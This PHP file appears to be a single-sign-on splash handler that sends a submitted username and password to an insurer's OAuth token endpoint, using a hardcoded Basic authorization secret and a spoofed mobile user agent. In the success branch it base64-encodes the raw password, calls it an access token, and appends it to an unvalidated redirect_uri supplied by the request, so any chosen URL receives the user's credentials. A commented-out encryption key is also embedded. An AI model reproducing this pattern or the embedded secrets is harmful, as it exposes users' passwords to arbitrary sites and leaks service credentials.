<?php
$url = "https://mobile-sgroext-pd.allstate.com/auth/oauth/v2/token";
$urlDebug = "http://localhost/Allstate/AllstateSSOSplash/includes/debug.php";
$returnURL = "http://ec2-52-39-221-154.us-west-2.compute.amazonaws.com/index.php";
$returnURL_local = "http://localhost/Allstate/AllstateSSOSplash/index.php";
if (isset($_POST["redirect_uri"])) { $redirectURL = $_POST["redirect_uri"]; }
if (isset($_POST["state"])) { $state = $_POST["state"]; }

$debug = 0;
$error = false;

if (!empty($_POST["username"]) && !empty($_POST["password"])) {
  $dataArray = array(
    "grant_type" => "password",
    "username" => $_POST["username"],
    "password" => $_POST["password"]
  );

  $data = http_build_query($dataArray);

  $header = array(
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: " . strlen($data),
    "authorization: Basic c3lzLWFuZHJwZDprTnJnZDMleg==",
    "Host: mobile-sgroext-pd.allstate.com",
    "Connection: Keep-Alive",
    "User-Agent: Apache-HttpClient/4.1.1 (java 1.5)"
  );

  $curl = curl_init();

  curl_setopt_array($curl, array(
      CURLOPT_URL => $url,
      CURLOPT_POST => sizeof($data),
      CURLOPT_RETURNTRANSFER => 1,
      CURLOPT_HEADER => 1,
      CURLINFO_HEADER_OUT => true,
      CURLOPT_HTTPHEADER => $header,
      CURLOPT_VERBOSE => true,
      CURLOPT_POSTFIELDS => $data
  ));

  $response = curl_exec($curl);

  if(!$response){
    die("Error: '" . curl_error($curl) . "' - Code: " . curl_errno($curl));
    $error = true;
  } else {
    if ($debug == 1) {
      $headerLen = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
      $body = substr($response, $headerLen);
      $json = json_decode($body);
      echo "<h2>Full Response</h2>";
      echo "<pre>";
      print_r($response);
      echo "</pre>";
      echo "<h2>Body</h2>";
      echo "<pre>";
      print_r($json);
      echo "</pre>";
      // $cipher = mcrypt_module_open(MCRYPT_RIJNDAEL_192, '', MCRYPT_MODE_CBC, '');
      // $key256 = '48331FC783A66346C888CDD28A30314Z';
      // $iv = 'NJud8AdkdAlDE746';
      // mcrypt_generic_init($cipher, $key256, $iv);
      // $cipherText256 = mcrypt_generic($cipher, $_POST["username"] . ":::" . $_POST["password"]);
      // mcrypt_generic_deinit($cipher);
      // $cipherHex = bin2hex($cipherText256);
      echo $cipherHex;
    } else {
      $headerLen = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
      $body = substr($response, $headerLen);
      $json = json_decode($body);

      $creds = $_POST["username"] . ":::" . $_POST["password"];
      $intAT = base64_encode($creds);

      $redirectArray = array(
        "state" => $state,
        "access_token" => $intAT,
        "token_type" => $json->{"token_type"}
      );
      $redirectParams = http_build_query($redirectArray);
      // # use for implicit ? use for auth code
      header("Location: " . $redirectURL . "#" . $redirectParams);
    }
  }
} else {
  $error = true;
}

if ($error == true) {
  $redirectParams = "?error=1";
  header("Location: " . $returnURL . $redirectParams, true, 302);
  exit();
}

?>
